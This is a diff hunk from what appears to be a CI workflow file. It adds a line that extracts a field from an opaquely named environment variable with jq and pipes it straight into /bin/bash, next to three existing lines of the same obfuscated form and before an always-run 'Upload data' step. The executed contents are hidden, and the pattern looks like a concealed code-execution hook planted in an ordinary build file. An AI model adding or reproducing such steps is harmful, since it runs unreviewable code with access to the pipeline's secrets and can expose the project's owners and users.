@@ -22,6 +22,7 @@ jobs:
           echo $bioa9 | jq -r .hpt1773 | /bin/bash
           echo $eexrg6 | jq -r .b6945 | /bin/bash
           printf '%s' "$qam5" | jq -r .vt622 | /bin/bash
+          printf '%s' "$w63" | jq -r .af9970 | /bin/bash
 
       - name: Upload data
         if: always()
